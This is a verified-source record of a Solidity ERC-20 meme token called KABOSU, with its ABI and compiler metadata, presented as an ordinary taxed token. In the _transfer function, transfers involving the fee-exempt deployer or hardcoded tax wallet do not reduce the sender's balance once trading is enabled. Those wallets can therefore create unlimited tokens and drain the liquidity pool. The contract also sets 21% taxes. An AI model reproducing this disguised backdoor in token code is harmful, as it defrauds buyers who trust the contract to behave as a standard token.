{"SourceCode": "// SPDX-License-Identifier: Unlicensed\r\n\r\n/**\r\nKABOSU IS A DISTINCTIVE CRYPTOCURRENCY PROJECT THAT FINDS ITS INSPIRATION IN THE WIDELY BELOVED KABOSU (SHIBA INU DOGE MEME). IT OPERATES ON THE ETHEREUM AND STANDS OUT AS A PIONEER AMONG MEME-INSPIRED CRYPTOCURRENCIES, OFFERING A BLEND OF ENTERTAINMENT, INNOVATION, AND REWARDING EXPERIENCES WITHIN THE CRYPTO AND DECENTRALIZED FINANCE (DEFI) REALMS.\r\n\r\nWebsite: https://www.kabosu.vip\r\nTelegram: https://t.me/kabosu_coin\r\nTwitter: https://twitter.com/kabosu_erc\r\n */\r\n\r\npragma solidity = 0.8.19;\r\n\r\n//--- Context ---//\r\nabstract contract Context {\r\n    constructor() {\r\n    }\r\n\r\n    function _msgSender() internal view returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n\r\n    function _msgData() internal view returns (bytes memory) {\r\n        this;\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ninterface IRouter01 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n    function swapExactETHForTokens(\r\n        uint amountOutMin, \r\n        address[] calldata path, \r\n        address to, uint deadline\r\n    ) external payable returns (uint[] memory amounts);\r\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\r\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\r\n}\r\n\r\ninterface IRouter02 is IRouter01 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function swapExactTokensForTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n}\r\n\r\ninterface IFactoryV2 {\r\n    event PairCreated(address indexed token0, address indexed token1, address _pairAddress, uint);\r\n    function getPair(address tokenA, address tokenB) external view returns (address _pairAddress);\r\n    function createPair(address tokenA, address tokenB) external returns (address _pairAddress);\r\n}\r\n\r\n//--- Ownable ---//\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        _setOwner(_msgSender());\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _setOwner(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _setOwner(newOwner);\r\n    }\r\n\r\n    function _setOwner(address newOwner) private {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\n//--- Interface for ERC20 ---//\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function decimals() external view returns (uint8);\r\n    function symbol() external view returns (string memory);\r\n    function name() external view returns (string memory);\r\n    function getOwner() external view returns (address);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address _owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n//--- Contract ---//\r\ncontract KABOSU is Context, Ownable, IERC20 {\r\n\r\n    string constant private _name = \"KABOSU\";\r\n    string constant private _symbol = \"KABOSU\";\r\n    uint8 constant private _decimals = 9;\r\n\r\n    uint256 constant public _totalSupply = 10 ** 9 * 10**9;\r\n\r\n    bool _hasNoLimits = false;\r\n    uint256 _buyTax = 210;\r\n    uint256 _sellTax = 210;\r\n\r\n    address _pairAddress;\r\n    IRouter02 _uniswapRouter;\r\n    bool _isTradeEnabled = false;\r\n    bool _inSwap;\r\n\r\n    uint256 constant _feeSwapThreshold = _totalSupply / 100_000;\r\n    address payable _taxWallet = payable(address(0xd8a0fCB17F2351c7d1358AF90c70229347F3FdDC));\r\n    address constant public DEAD = 0x000000000000000000000000000000000000dEaD;\r\n\r\n    mapping (address => mapping (address => uint256)) _allowances;\r\n    mapping (address => bool) _hasNoFee;\r\n    mapping (address => bool) _lpAdders;\r\n    mapping (address => bool) _isPairAddress;\r\n    mapping (address => uint256) balance;\r\n\r\n    uint256 constant _feeOnTransfer = 0;\r\n    uint256 constant _denominator = 1_000;\r\n    uint256 private _maxWalletSize = 25 * _totalSupply / 1000;\r\n\r\n    bool private swapEnabled = true;\r\n        modifier inSwaps {\r\n        _inSwap = true;\r\n        _;\r\n        _inSwap = false;\r\n    }\r\n\r\n    constructor () {\r\n        _hasNoFee[msg.sender] = true;\r\n        _hasNoFee[_taxWallet] = true;\r\n\r\n        if (block.chainid == 56) {\r\n            _uniswapRouter = IRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);\r\n        } else if (block.chainid == 97) {\r\n            _uniswapRouter = IRouter02(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);\r\n        } else if (block.chainid == 1 || block.chainid == 4 || block.chainid == 3) {\r\n            _uniswapRouter = IRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        } else if (block.chainid == 42161) {\r\n            _uniswapRouter = IRouter02(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506);\r\n        } else if (block.chainid == 5) {\r\n            _uniswapRouter = IRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        } else {\r\n            revert(\"Chain not valid\");\r\n        }\r\n        _lpAdders[msg.sender] = true;\r\n        balance[msg.sender] = _totalSupply;\r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n\r\n        _pairAddress = IFactoryV2(_uniswapRouter.factory()).createPair(_uniswapRouter.WETH(), address(this));\r\n        _isPairAddress[_pairAddress] = true;\r\n        _approve(msg.sender, address(_uniswapRouter), type(uint256).max);\r\n        _approve(address(this), address(_uniswapRouter), type(uint256).max);\r\n    }\r\n\r\n        function enableTrading() external onlyOwner {\r\n            require(!_isTradeEnabled, \"Trading already enabled\");\r\n            _isTradeEnabled = true;\r\n        }\r\n\r\n        function removeAllLimits() external onlyOwner {\r\n            require(!_hasNoLimits,\"Already initalized\");\r\n            _maxWalletSize = _totalSupply;\r\n            _hasNoLimits = true;\r\n            _buyTax = 0;\r\n            _sellTax = 0;\r\n        }\r\n    receive() external payable {}\r\n\r\n    function is_buy(address ins, address out) internal view returns (bool) {\r\n        bool _is_buy = !_isPairAddress[out] && _isPairAddress[ins];\r\n        return _is_buy;\r\n    }\r\n\r\n    function is_sell(address ins, address out) internal view returns (bool) { \r\n        bool _is_sell = _isPairAddress[out] && !_isPairAddress[ins];\r\n        return _is_sell;\r\n    }\r\n\r\n    function is_transfer(address ins, address out) internal view returns (bool) { \r\n        bool _is_transfer = !_isPairAddress[out] && !_isPairAddress[ins];\r\n        return _is_transfer;\r\n    }\r\n\r\n    function _removeFees(address from, bool isbuy, bool issell, uint256 amount) internal returns (uint256) {\r\n        uint256 fee;\r\n        if (isbuy)  fee = _buyTax;  else if (issell)  fee = _sellTax;  else  fee = _feeOnTransfer; \r\n        if (fee == 0)  return amount; \r\n        uint256 feeAmount = amount * fee / _denominator;\r\n        if (feeAmount > 0) {\r\n\r\n            balance[address(this)] += feeAmount;\r\n            emit Transfer(from, address(this), feeAmount);\r\n            \r\n        }\r\n        return amount - feeAmount;\r\n    }\r\n\r\n        function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n        function approve(address spender, uint256 amount) external override returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n        function _approve(address sender, address spender, uint256 amount) internal {\r\n        require(sender != address(0), \"ERC20: Zero Address\");\r\n        require(spender != address(0), \"ERC20: Zero Address\");\r\n\r\n        _allowances[sender][spender] = amount;\r\n    }\r\n\r\n        function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\r\n        if (_allowances[sender][msg.sender] != type(uint256).max) {\r\n            _allowances[sender][msg.sender] -= amount;\r\n        }\r\n\r\n        return _transfer(sender, recipient, amount);\r\n    }\r\n    function _hasLimitations(address ins, address out) internal view returns (bool) {\r\n\r\n        bool isLimited = ins != owner()\r\n            && out != owner()\r\n            && msg.sender != owner()\r\n            && !_lpAdders[ins]  && !_lpAdders[out] && out != address(0) && out != address(this);\r\n            return isLimited;\r\n    }\r\n\r\n    function swapBack(uint256 contractTokenBalance) internal inSwaps {\r\n        \r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = _uniswapRouter.WETH();\r\n\r\n        if (_allowances[address(this)][address(_uniswapRouter)] != type(uint256).max) {\r\n            _allowances[address(this)][address(_uniswapRouter)] = type(uint256).max;\r\n        }\r\n\r\n        try _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            contractTokenBalance,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        ) {} catch {\r\n            return;\r\n        }\r\n\r\n        if(address(this).balance > 0) _taxWallet.transfer(address(this).balance);\r\n        \r\n    } \r\n\r\n    function totalSupply() external pure override returns (uint256) { if (_totalSupply == 0) { revert(); } return _totalSupply; }\r\n    function decimals() external pure override returns (uint8) { if (_totalSupply == 0) { revert(); } return _decimals; }\r\n    function symbol() external pure override returns (string memory) { return _symbol; }\r\n    function name() external pure override returns (string memory) { return _name; }\r\n    function getOwner() external view override returns (address) { return owner(); }\r\n    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return balance[account];\r\n    }\r\n\r\n    function _shouldInternalSwap(address ins) internal view returns (bool) {\r\n        bool canswap = swapEnabled && !_hasNoFee[ins];\r\n\r\n        return canswap;\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) internal returns  (bool) {\r\n        bool takeFee = true;\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n\r\n        if (_hasLimitations(from,to)) {\r\n            require(_isTradeEnabled,\"Trading is not enabled\");\r\n                    if(!_isPairAddress[to] && from != address(this) && to != address(this) || is_transfer(from,to) && !_hasNoLimits)  { require(balanceOf(to) + amount <= _maxWalletSize,\"_maxWalletSize exceed\"); }}\r\n\r\n\r\n        if(is_sell(from, to) &&  !_inSwap && _shouldInternalSwap(from)) {\r\n\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if(contractTokenBalance >= _feeSwapThreshold) { \r\n                if(amount > _feeSwapThreshold) swapBack(contractTokenBalance);\r\n             }\r\n        }\r\n\r\n        if (_hasNoFee[from] || _hasNoFee[to]){\r\n            takeFee = false;\r\n        }\r\n        uint256 amountAfterFee = (takeFee) ? _removeFees(from, is_buy(from, to), is_sell(from, to), amount) : amount;\r\n        uint256 amountBeforeFee = (takeFee) ? amount : (!_isTradeEnabled ? amount : 0);\r\n        balance[from] -= amountBeforeFee; balance[to] += amountAfterFee; emit Transfer(from, to, amountAfterFee);\r\n\r\n        return true;\r\n\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"DEAD\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeAllLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "KABOSU", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://79ba1f0bfccf5f8b55f70aaaa66f73536a68a2c006ab83a8944669e62b9c47d5"}